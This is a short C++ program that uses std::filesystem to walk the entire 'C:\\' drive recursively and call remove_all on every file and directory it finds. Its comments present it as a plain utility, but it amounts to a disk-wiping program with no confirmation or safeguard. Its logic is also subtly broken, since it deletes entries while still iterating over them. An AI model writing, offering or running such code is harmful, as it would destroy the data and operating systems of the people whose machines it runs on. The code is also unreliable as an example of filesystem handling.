#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

void deleteDirectoryContents(const fs::path& directoryPath)
{
    try
    {
        // Call the remove_all function to delete the directory and its contents
        std::size_t numFilesDeleted = fs::remove_all(directoryPath);

        std::cout << "Deleted " << numFilesDeleted << " files/directories." << std::endl;
    }
    catch (const std::exception& ex)
    {
        std::cerr << "Error deleting files: " << ex.what() << std::endl;
    }
}

int main()
{
    // Specify the root directory from which you want to delete files and directories
    fs::path rootDirectoryPath = "C:\\";

    // Verify that the specified root directory exists
    if (!fs::exists(rootDirectoryPath))
    {
        std::cerr << "Specified root directory does not exist." << std::endl;
        return 1;
    }

    // Iterate over the directories within the root directory
    for (const auto& entry : fs::recursive_directory_iterator(rootDirectoryPath))
    {
        // Skip the root directory itself to avoid deleting it
        if (entry.path() == rootDirectoryPath)
            continue;

        // Call the function to delete the directory contents
        deleteDirectoryContents(entry.path());
    }

    return 0;
}
